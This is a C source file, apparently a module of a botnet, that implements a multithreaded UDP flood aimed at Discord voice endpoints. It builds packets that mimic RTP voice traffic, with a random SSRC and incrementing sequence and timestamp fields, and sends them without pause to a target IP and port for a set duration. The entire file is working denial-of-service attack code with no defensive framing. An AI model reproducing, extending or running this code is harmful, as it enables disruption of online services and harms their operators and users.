#include "../../bot.h"
#include "l4.h"
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

void *discord_worker(void *arg) {
    target_t *t = arg;
    struct sockaddr_in addr;
    addr.sin_family = AF_INET; addr.sin_port = htons(t->port);
    inet_pton(AF_INET, t->ip, &addr.sin_addr);
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return NULL;
    XorShift64 *rng = rng_new();
    uint8_t buf[120];
    buf[0] = 0x80; buf[1] = 0x01;
    uint32_t ssrc = (uint32_t)rng_next(rng);
    buf[8] = ssrc>>24; buf[9] = ssrc>>16; buf[10] = ssrc>>8; buf[11] = ssrc;
    rng_fill(rng, buf+12, 108);
    uint16_t seq = 0;
    uint32_t ts = 0;
    int check = 1000;
    time_t end = time(NULL) + t->sec;
    while (running) {
        if (--check <= 0) { if (time(NULL) >= end) break; check = 1000; }
        seq++; ts += 960;
        buf[2] = seq>>8; buf[3] = seq;
        buf[4] = ts>>24; buf[5] = ts>>16; buf[6] = ts>>8; buf[7] = ts;
        sendto(fd, buf, 120, 0, (struct sockaddr*)&addr, sizeof(addr));
    }
    close(fd); free(rng);
    return NULL;
}

void flood_discord(const char *target, int port, int sec) {
    target_t t; if (resolve_target(&t, target) < 0) return;
    t.port = port; t.sec = sec;
    int n = g_thread_count;
    pthread_t threads[n];
    for (int i = 0; i < n; i++)
        pthread_create(&threads[i], NULL, discord_worker, &t);
    for (int i = 0; i < n; i++)
        pthread_join(threads[i], NULL);
}
